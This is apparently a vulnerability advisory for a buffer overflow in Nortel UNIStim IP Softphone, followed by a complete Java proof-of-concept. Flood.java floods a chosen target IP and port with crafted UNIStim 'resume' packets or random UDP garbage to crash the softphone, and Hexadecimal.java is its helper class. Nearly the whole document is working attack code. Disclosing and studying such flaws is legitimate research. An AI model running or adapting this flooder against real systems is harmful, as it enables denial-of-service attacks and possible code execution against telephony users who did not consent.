source: http://www.securityfocus.com/bid/26118/info

Nortel Networks UNIStim IP Softphone is prone to a buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Flood.java
/**
 * June, 2007 - Cyrill Brunschwiler - COMPASS SECURITY AG
 *
 * No warranty, all rights reserved.
 */
 
package ch.csnc.udpollution;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.util.Random;

public class Flood {
	
	private static DatagramSocket m_socket = null;
	private static InetSocketAddress m_address = null;
	private static long m_start;
	private static int m_default = -1;
	private static Random m_rand = new Random();
	
	
	/**
	 * @param args
	 */
	public static void main(String[] args) {
		
		try {
			m_address = new InetSocketAddress(args[0], 
Integer.parseInt(args[1]));
			m_socket = new 
DatagramSocket(Integer.parseInt(args[2]));
			
			String packetType = args[3]; 
			long count = Integer.parseInt(args[4]);
			int maxlen = m_default;
			
			try {
				maxlen = Integer.parseInt(args[5]);
			} catch (RuntimeException e) {			
			}
			
			System.out.println("Target: " + 
m_address.getAddress().getHostAddress() +":" + m_address.getPort());
			System.out.println("Packet: " + packetType);
			System.out.print("\nflooding.");
			m_start = System.currentTimeMillis();
			byte[] data;
			
			if ("resume".equals(packetType)) {
				
				String resume = "FFFFFFFF" + "0202" + 
"FFFFFFFF";
				byte [] overlay = 
Hexadecimal.parseSeq(resume);
							
				for (int i=1; i<=count; i++) {
					
					if (maxlen == -1) {
						data =  
Hexadecimal.parseSeq(resume + "9e0308");
					}
					else {
						data = new 
byte[m_rand.nextInt(maxlen) + 10];
						m_rand.nextBytes(data);
						
						
						for (int j=0; 
j<overlay.length;j++) {
							data[j] = 
overlay[j];
						}						
					}
					
					sendData(data);
					
					if (count > 20 && i % (count/20) 
== 0)
						System.out.print(".");
				}
			}
			if ("garbage".equals(packetType)) {
				
				for (int i=1; i<=count; i++) {
					data = new 
byte[m_rand.nextInt(maxlen)];
					m_rand.nextBytes(data);
					sendData(data);
					
					if (count > 20 && i % (count/20) 
== 0)
						System.out.print(".");
				}
			}
			
			long time = (System.currentTimeMillis() - 
m_start)/1000;
			long avg = count;
			
			if (time > 0)
				avg = count/time;
			
			System.out.println(" done in " + time + "s; avg. 
" +avg+ " packets/s");
			
		} catch (Exception e) {
			System.out.println("\nusage: java 
ch.csnc.udpollution.Flood destIP destPort sourcePort packetType 
packetAmount [packetLength]");
			System.out.println("       java 
ch.csnc.udpollution.Flood 1.2.3.4 5678 9012 garbage 4000 30\n");
			
			e.printStackTrace();
		}
	}
	
	private static void sendData(byte [] data) throws IOException {
		
		int len = data.length;
		
		DatagramPacket packet = new DatagramPacket(new 
byte[len], len);
		packet.setAddress(m_address.getAddress());
		packet.setPort(m_address.getPort());
		packet.setData(data);
		packet.setLength(len);
		m_socket.send(packet);
	}
}

Hexadecimal.java
package ch.csnc.udpollution;

import java.util.StringTokenizer;

/*
 * @(#)Hexadecimal.java
 * 
 * IBM Confidential-Restricted
 * 
 * OCO Source Materials
 * 
 * 03L7246 (c) Copyright IBM Corp. 1996, 1998
 * 
 * The source code for this program is not published or otherwise
 * divested of its trade secrets, irrespective of what has been
 * deposited with the U.S. Copyright Office.
 */

/**
 * The <tt>Hexadecimal</tt> class
 * 
 * @version     1.00    $Date: 2001/07/28 06:33:13 $
 * @author      ONO Kouichi
 */

public class Hexadecimal {
	private String _hex = null;
	private int _num = 0;

	/**
	 * Constructs a hexadecimal number with a byte.
	 * @param num a byte
	 */
	public Hexadecimal(byte num) {
		_hex = valueOf(num);
		_num = (int)num;
	}
	/**
	 * Constructs a hexadecimal number with a integer.
	 * @param num a integer
	 */
	public Hexadecimal(int num) {
		_hex = valueOf(num);
		_num = (int)num;
	}
	/**
	 * Constructs a hexadecimal number with a short integer.
	 * @param num a short integer
	 */
	public Hexadecimal(short num) {
		_hex = valueOf(num);
		_num = (int)num;
	}
	/**
	 * Gets a byte value.
	 * @return a byte of the hexadecimal number
	 */
	public byte byteValue() throws NumberFormatException {
		if (_num > 255 || _num < 0) {
			throw new NumberFormatException("Out of range 
for byte.");
		} 
		return (byte)_num;
	}
	// -   /**
	// -    * Constructs a hexadecimal number with a long integer.
	// -    * @param num a long integer
	// -    */
	// -   public Hexadecimal(long num) {
	// -     _hex = valueOf(num);
	// -     _num = (int)num;
	// -   }

	/**
	 * Gets a string in hexadecimal notation.
	 * @return string in hexadecimal notation of the number
	 */
	public String hexadecimalValue() {
		return _hex;
	}
	/**
	 * Gets a integer value.
	 * @return a integer of the hexadecimal number
	 */
	public int intValue() throws NumberFormatException {
		if (_num > 4294967295L || _num < 0) {
			throw new NumberFormatException("Out of range 
for integer.");
		} 
		return (int)_num;
	}
	public static void main(String[] args) {
		StringBuffer buff = new StringBuffer();

		for (int i = 0; i < args.length; i++) {
			buff.append(args[i]);
		} 
		try {
			byte[] seq = parseSeq(buff.toString());

			for (int i = 0; i < seq.length; i++) {
				System.out.print(seq[i] + " ");
			} 
			System.out.println("");
		} catch (NumberFormatException excpt) {
			System.err.println(excpt.toString());
		} 
	}
	// -   /**
	// -    * Converts a string in hexadecimal notation into long 
integer.
	// -    * @param hex string in hexadecimal notation
	// -    * @return a long integer (8bytes)
	// -    */
	// -   public static long parseLong(String hex) throws 
NumberFormatException {
	// -     if(hex==null) {
	// -       throw new IllegalArgumentException("Null string in 
hexadecimal notation.");
	// -     }
	// -     if(hex.equals("")) {
	// -       return 0;
	// -     }
	// -
	// -     return Integer.decode("0x"+hex).longValue();
	// -   }

	/**
	 * Converts a pair of characters as an octet in hexadecimal 
notation into integer.
	 * @param c0 higher character of given octet in hexadecimal 
notation
	 * @param c1 lower character of given octet in hexadecimal 
notation
	 * @return a integer value of the octet
	 */
	public static int octetValue(char c0, 
								 char 
c1) throws NumberFormatException {
		int n0 = Character.digit(c0, 16);

		if (n0 < 0) {
			throw new NumberFormatException(c0 
											
+ " is not a hexadecimal character.");
		} 
		int n1 = Character.digit(c1, 16);

		if (n1 < 0) {
			throw new NumberFormatException(c1 
											
+ " is not a hexadecimal character.");
		} 
		return (n0 << 4) + n1;
	}
	/**
	 * Converts a string in hexadecimal notation into byte.
	 * @param hex string in hexadecimal notation
	 * @return a byte (1bytes)
	 */
	public static byte parseByte(String hex) throws 
NumberFormatException {
		if (hex == null) {
			throw new IllegalArgumentException("Null string 
in hexadecimal notation.");
		} 
		if (hex.equals("")) {
			return 0;
		} 
		Integer num = Integer.decode("0x" + hex);
		int n = num.intValue();

		if (n > 255 || n < 0) {
			throw new NumberFormatException("Out of range 
for byte.");
		} 
		return num.byteValue();
	}
	/**
	 * Converts a string in hexadecimal notation into integer.
	 * @param hex string in hexadecimal notation
	 * @return a integer (4bytes)
	 */
	public static int parseInt(String hex) throws 
NumberFormatException {
		if (hex == null) {
			throw new IllegalArgumentException("Null string 
in hexadecimal notation.");
		} 
		if (hex.equals("")) {
			return 0;
		} 
		Integer num = Integer.decode("0x" + hex);
		long n = num.longValue();

		if (n > 4294967295L || n < 0L) {
			throw new NumberFormatException("Out of range 
for integer.");
		} 
		return num.intValue();
	}
	/**
	 * Converts a string in hexadecimal notation into byte sequence.
	 * @param str a string in hexadecimal notation
	 * @return byte sequence
	 */
	public static byte[] parseSeq(String str) throws 
NumberFormatException {
		if (str == null || str.equals("")) {
			return null;
		} 
		int len = str.length();

		if (len % 2 != 0) {
			throw new NumberFormatException("Illegal length 
of string in hexadecimal notation.");
		} 
		int numOfOctets = len / 2;
		byte[] seq = new byte[numOfOctets];

		for (int i = 0; i < numOfOctets; i++) {
			String hex = str.substring(i * 2, i * 2 + 2);

			seq[i] = parseByte(hex);
		} 
		return seq;
	}
	/**
	 * Converts a string in hexadecimal notation into byte sequence.
	 * @param str a string in hexadecimal notation
	 * @param delimiters a set of delimiters
	 * @return byte sequence
	 */
	public static byte[] parseSeq(String str, String delimiters) 
			throws NumberFormatException {
		if (str == null || str.equals("")) {
			return null;
		} 
		if (delimiters == null || delimiters.equals("")) {
			return parseSeq(str);
		} 
		StringTokenizer tokenizer = new StringTokenizer(str, 
delimiters);
		int numOfOctets = tokenizer.countTokens();
		byte[] seq = new byte[numOfOctets];
		int i = 0;

		while (tokenizer.hasMoreTokens() && i < numOfOctets) {
			seq[i] = 
Hexadecimal.parseByte(tokenizer.nextToken());
			i++;
		} 
		return seq;
	}
	/**
	 * Converts a string in hexadecimal notation into short integer.
	 * @param hex string in hexadecimal notation
	 * @return a short integer (2bytes)
	 */
	public static short parseShort(String hex) throws 
NumberFormatException {
		if (hex == null) {
			throw new IllegalArgumentException("Null string 
in hexadecimal notation.");
		} 
		if (hex.equals("")) {
			return 0;
		} 
		Integer num = Integer.decode("0x" + hex);
		int n = num.intValue();

		if (n > 65535 || n < 0) {
			throw new NumberFormatException("Out of range 
for short integer.");
		} 
		return num.shortValue();
	}
	/**
	 * Gets a short integer value.
	 * @return a short integer of the hexadecimal number
	 */
	public short shortValue() throws NumberFormatException {
		if (_num > 65535 || _num < 0) {
			throw new NumberFormatException("Out of range 
for short integer.");
		} 
		return (short)_num;
	}
	/**
	 * Converts a byte sequence into its hexadecimal notation.
	 * @param seq a byte sequence
	 * @return hexadecimal notation of the byte sequence
	 */
	public static String valueOf(byte[] seq) {
		if (seq == null) {
			return null;
		} 
		StringBuffer buff = new StringBuffer();

		for (int i = 0; i < seq.length; i++) {
			buff.append(valueOf(seq[i], true));
		} 
		return buff.toString();
	}
	/**
	 * Converts a byte sequence into its hexadecimal notation.
	 * @param seq a byte sequence
	 * @param separator separator between bytes
	 * @return hexadecimal notation of the byte sequence
	 */
	public static String valueOf(byte[] seq, char separator) {
		if (seq == null) {
			return null;
		} 
		StringBuffer buff = new StringBuffer();

		for (int i = 0; i < seq.length; i++) {
			if (i > 0) {
				buff.append(separator);
			} 
			buff.append(valueOf(seq[i], true));
		} 
		return buff.toString();
	}
	/**
	 * Converts a byte into its hexadecimal notation.
	 * @param num a byte (1bytes)
	 * @return hexadecimal notation of the byte
	 */
	public static String valueOf(byte num) {
		return valueOf(num, true);
	}
	/**
	 * Converts a byte into its hexadecimal notation.
	 * @param num a byte (1bytes)
	 * @param padding fit the length to 2 by filling with '0' when 
padding is true
	 * @return hexadecimal notation of the byte
	 */
	public static String valueOf(byte num, boolean padding) {
		String hex = Integer.toHexString((int)num);

		if (padding) {
			hex = "00" + hex;
			int len = hex.length();

			hex = hex.substring(len - 2, len);
		} 
		return hex;
	}
	/**
	 * Converts a integer into its hexadecimal notation.
	 * @param num a integer (4bytes)
	 * @return hexadecimal notation of the integer
	 */
	public static String valueOf(int num) {
		return valueOf(num, true);
	}
	/**
	 * Converts a integer into its hexadecimal notation.
	 * @param num a integer (4bytes)
	 * @param padding fit the length to 8 by filling with '0' when 
padding is true
	 * @return hexadecimal notation of the integer
	 */
	public static String valueOf(int num, boolean padding) {
		String hex = Integer.toHexString(num);

		if (padding) {
			hex = "00000000" + hex;
			int len = hex.length();

			hex = hex.substring(len - 8, len);
		} 
		return hex;
	}
	/**
	 * Converts a long integer into its hexadecimal notation.
	 * @param num a long integer (8bytes)
	 * @return hexadecimal notation of the long integer
	 */
	public static String valueOf(long num) {
		return valueOf(num, true);
	}
	/**
	 * Converts a long integer into its hexadecimal notation.
	 * @param num a long integer (8bytes)
	 * @param padding fit the length to 16 by filling with '0' when 
padding is true
	 * @return hexadecimal notation of the long integer
	 */
	public static String valueOf(long num, boolean padding) {
		String hex = Long.toHexString(num);

		if (padding) {
			hex = "0000000000000000" + hex;
			int len = hex.length();

			hex = hex.substring(len - 16, len);
		} 
		return hex;
	}
	/**
	 * Converts a short integer into its hexadecimal notation.
	 * @param num a short integer (2bytes)
	 * @return hexadecimal notation of the short integer
	 */
	public static String valueOf(short num) {
		return valueOf(num, true);
	}
	/**
	 * Converts a short integer into its hexadecimal notation.
	 * @param num a short integer (2bytes)
	 * @param padding fit the length to 8 by filling with '0' when 
padding is true
	 * @return hexadecimal notation of the short integer
	 */
	public static String valueOf(short num, boolean padding) {
		String hex = Integer.toHexString((int)num);

		if (padding) {
			hex = "0000" + hex;
			int len = hex.length();

			hex = hex.substring(len - 4, len);
		} 
		return hex;
	}
}
